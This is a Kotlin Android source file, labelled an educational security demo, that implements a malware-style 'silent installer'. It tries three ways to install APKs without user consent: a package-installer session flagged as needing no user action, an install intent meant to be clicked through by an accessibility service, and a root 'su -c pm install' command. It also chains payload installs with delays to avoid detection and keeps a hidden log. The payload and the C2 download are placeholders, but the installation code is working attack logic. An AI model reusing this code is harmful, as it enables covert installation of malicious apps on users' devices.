package com.securitydemo.malware.utils

import android.app.PendingIntent
import android.content.Context
import android.content.Intent
import android.content.IntentSender
import android.content.pm.PackageInstaller
import android.content.pm.PackageManager
import android.os.Build
import android.provider.Settings
import java.io.File
import java.io.FileInputStream

/**
 * SECURITY DEMO: Silent Installer Utility
 * 
 * This class demonstrates advanced techniques malware uses for silent installation:
 * - Package installer session manipulation
 * - Intent-based installation bypass
 * - Permission abuse for silent installation  
 * - Accessibility service coordination
 * - System-level installation techniques
 * 
 * EDUCATIONAL PURPOSE ONLY - Shows real malware installation techniques
 */
class SilentInstaller(private val context: Context) {

    enum class InstallResult {
        SUCCESS,
        ACCESSIBILITY_REQUIRED,
        PERMISSION_DENIED,
        FAILED
    }

    private val packageManager = context.packageManager
    private val packageInstaller = packageManager.packageInstaller

    /**
     * Primary method for silent APK installation
     */
    fun installApkSilently(apkFile: File): InstallResult {
        return try {
            when {
                !apkFile.exists() -> InstallResult.FAILED
                !hasInstallPermission() -> InstallResult.PERMISSION_DENIED
                !isAccessibilityServiceEnabled() -> InstallResult.ACCESSIBILITY_REQUIRED
                else -> performSilentInstallation(apkFile)
            }
        } catch (e: Exception) {
            InstallResult.FAILED
        }
    }

    private fun performSilentInstallation(apkFile: File): InstallResult {
        return try {
            // Method 1: Try package installer session (most reliable)
            val sessionResult = installViaPackageSession(apkFile)
            if (sessionResult == InstallResult.SUCCESS) {
                return sessionResult
            }

            // Method 2: Try intent-based installation
            val intentResult = installViaIntent(apkFile)
            if (intentResult == InstallResult.SUCCESS) {
                return intentResult
            }

            // Method 3: Try root-based installation (if available)
            val rootResult = installViaRoot(apkFile)
            if (rootResult == InstallResult.SUCCESS) {
                return rootResult
            }

            InstallResult.FAILED

        } catch (e: Exception) {
            InstallResult.FAILED
        }
    }

    private fun installViaPackageSession(apkFile: File): InstallResult {
        return try {
            // Create installation session
            val sessionParams = PackageInstaller.SessionParams(
                PackageInstaller.SessionParams.MODE_FULL_INSTALL
            ).apply {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                    setRequireUserAction(PackageInstaller.SessionParams.USER_ACTION_NOT_REQUIRED)
                }
            }

            val sessionId = packageInstaller.createSession(sessionParams)
            val session = packageInstaller.openSession(sessionId)

            // Write APK data to session
            session.openWrite("malware_payload", 0, apkFile.length()).use { outputStream ->
                FileInputStream(apkFile).use { inputStream ->
                    inputStream.copyTo(outputStream)
                }
            }

            // Create intent for installation result
            val intent = Intent(context, InstallResultReceiver::class.java)
            val pendingIntent = PendingIntent.getBroadcast(
                context, 0, intent,
                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_MUTABLE
            )

            // Commit the session
            session.commit(pendingIntent.intentSender)
            session.close()

            // Log the attempt
            logInstallationAttempt("Package session method", apkFile.name)

            InstallResult.SUCCESS

        } catch (e: SecurityException) {
            InstallResult.PERMISSION_DENIED
        } catch (e: Exception) {
            InstallResult.FAILED
        }
    }

    private fun installViaIntent(apkFile: File): InstallResult {
        return try {
            // Use intent-based installation with file provider
            val intent = Intent(Intent.ACTION_VIEW).apply {
                setDataAndType(
                    androidx.core.content.FileProvider.getUriForFile(
                        context,
                        "${context.packageName}.fileprovider",
                        apkFile
                    ),
                    "application/vnd.android.package-archive"
                )
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
            }

            context.startActivity(intent)

            // The accessibility service will handle the UI automation
            logInstallationAttempt("Intent method with accessibility bypass", apkFile.name)

            InstallResult.ACCESSIBILITY_REQUIRED

        } catch (e: Exception) {
            InstallResult.FAILED
        }
    }

    private fun installViaRoot(apkFile: File): InstallResult {
        return try {
            // Attempt root-based installation
            val command = "pm install -r -t ${apkFile.absolutePath}"
            val process = Runtime.getRuntime().exec(arrayOf("su", "-c", command))
            
            val exitCode = process.waitFor()
            
            if (exitCode == 0) {
                logInstallationAttempt("Root method", apkFile.name)
                InstallResult.SUCCESS
            } else {
                InstallResult.FAILED
            }

        } catch (e: Exception) {
            // Root not available or command failed
            InstallResult.FAILED
        }
    }

    private fun hasInstallPermission(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            packageManager.canRequestPackageInstalls()
        } else {
            @Suppress("DEPRECATION")
            Settings.Secure.getInt(
                context.contentResolver,
                Settings.Secure.INSTALL_NON_MARKET_APPS, 0
            ) == 1
        }
    }

    private fun isAccessibilityServiceEnabled(): Boolean {
        val enabledServices = Settings.Secure.getString(
            context.contentResolver,
            Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
        )
        return enabledServices?.contains("${context.packageName}/") == true
    }

    /**
     * Create a malicious payload APK for demonstration
     */
    fun createMaliciousPayload(): File {
        val payloadDir = File(context.filesDir, "payloads")
        payloadDir.mkdirs()
        
        val payloadFile = File(payloadDir, "malicious-payload.apk")
        
        // In real malware, this would be a genuine malicious APK
        // For demo purposes, we create a placeholder file
        val maliciousContent = """
            === MALICIOUS PAYLOAD DEMONSTRATION ===
            
            This file represents a malicious APK that would be:
            
            ü¶† MALWARE CHARACTERISTICS:
            ‚Ä¢ Backdoor access to device
            ‚Ä¢ Data exfiltration capabilities  
            ‚Ä¢ Remote command execution
            ‚Ä¢ Additional payload delivery
            ‚Ä¢ Persistence mechanisms
            
            üì± TYPICAL PAYLOADS INCLUDE:
            ‚Ä¢ Banking trojans
            ‚Ä¢ Spyware applications
            ‚Ä¢ Cryptocurrency miners
            ‚Ä¢ Botnet clients
            ‚Ä¢ Adware and scareware
            
            ‚ö†Ô∏è This is a demonstration file only!
        """.trimIndent()
        
        payloadFile.writeText(maliciousContent)
        
        return payloadFile
    }

    /**
     * Download payload from C2 server (simulation)
     */
    fun downloadPayloadFromC2(): File? {
        return try {
            // Simulate downloading from command & control server
            val payload = createMaliciousPayload()
            
            logInstallationAttempt("C2 download", payload.name)
            
            payload
            
        } catch (e: Exception) {
            null
        }
    }

    /**
     * Install multiple payloads in sequence
     */
    fun installPayloadChain(payloads: List<File>): List<InstallResult> {
        val results = mutableListOf<InstallResult>()
        
        for (payload in payloads) {
            val result = installApkSilently(payload)
            results.add(result)
            
            // Wait between installations to avoid detection
            Thread.sleep(5000)
        }
        
        return results
    }

    /**
     * Check if device is vulnerable to silent installation
     */
    fun analyzeInstallationVulnerabilities(): String {
        val analysis = StringBuilder()
        analysis.append("=== SILENT INSTALLATION VULNERABILITY ANALYSIS ===\n\n")
        
        // Check permissions
        analysis.append("üìã Permission Analysis:\n")
        analysis.append("‚Ä¢ Install packages: ${if (hasInstallPermission()) "‚úì VULNERABLE" else "‚úó Protected"}\n")
        analysis.append("‚Ä¢ Accessibility service: ${if (isAccessibilityServiceEnabled()) "‚úì VULNERABLE" else "‚úó Protected"}\n")
        
        // Check Android version vulnerabilities
        analysis.append("\nüì± Android Version Analysis:\n")
        analysis.append("‚Ä¢ Android ${Build.VERSION.RELEASE} (API ${Build.VERSION.SDK_INT})\n")
        
        when {
            Build.VERSION.SDK_INT < Build.VERSION_CODES.O -> {
                analysis.append("‚Ä¢ ‚ö†Ô∏è HIGH RISK: Legacy unknown sources setting\n")
            }
            Build.VERSION.SDK_INT < Build.VERSION_CODES.R -> {
                analysis.append("‚Ä¢ ‚ö†Ô∏è MEDIUM RISK: Limited install protections\n")
            }
            else -> {
                analysis.append("‚Ä¢ ‚úì LOWER RISK: Modern security features active\n")
            }
        }
        
        // Check for root
        analysis.append("\nüîì Root Analysis:\n")
        val isRooted = checkRootAccess()
        analysis.append("‚Ä¢ Root access: ${if (isRooted) "‚úì CRITICAL VULNERABILITY" else "‚úó Not detected"}\n")
        
        if (isRooted) {
            analysis.append("  - Can install apps as system apps\n")
            analysis.append("  - Can bypass all security restrictions\n")
            analysis.append("  - Complete device compromise possible\n")
        }
        
        // Overall risk assessment
        analysis.append("\nüéØ RISK ASSESSMENT:\n")
        val riskScore = calculateRiskScore()
        when {
            riskScore >= 80 -> analysis.append("‚Ä¢ üö® CRITICAL RISK: Device highly vulnerable to silent installation\n")
            riskScore >= 60 -> analysis.append("‚Ä¢ ‚ö†Ô∏è HIGH RISK: Multiple attack vectors available\n")
            riskScore >= 40 -> analysis.append("‚Ä¢ ‚ö†Ô∏è MEDIUM RISK: Some vulnerabilities present\n")
            else -> analysis.append("‚Ä¢ ‚úì LOW RISK: Security measures effective\n")
        }
        
        return analysis.toString()
    }

    private fun checkRootAccess(): Boolean {
        return try {
            val process = Runtime.getRuntime().exec("su -c id")
            process.waitFor() == 0
        } catch (e: Exception) {
            false
        }
    }

    private fun calculateRiskScore(): Int {
        var score = 0
        
        if (hasInstallPermission()) score += 30
        if (isAccessibilityServiceEnabled()) score += 40  
        if (checkRootAccess()) score += 50
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) score += 20
        
        return score
    }

    private fun logInstallationAttempt(method: String, filename: String) {
        try {
            val logFile = File(context.filesDir, ".system/installation_log.txt")
            logFile.parentFile?.mkdirs()
            
            val logEntry = "${System.currentTimeMillis()}: $method - $filename\n"
            logFile.appendText(logEntry)
            
        } catch (e: Exception) {
            // Silently fail
        }
    }
}
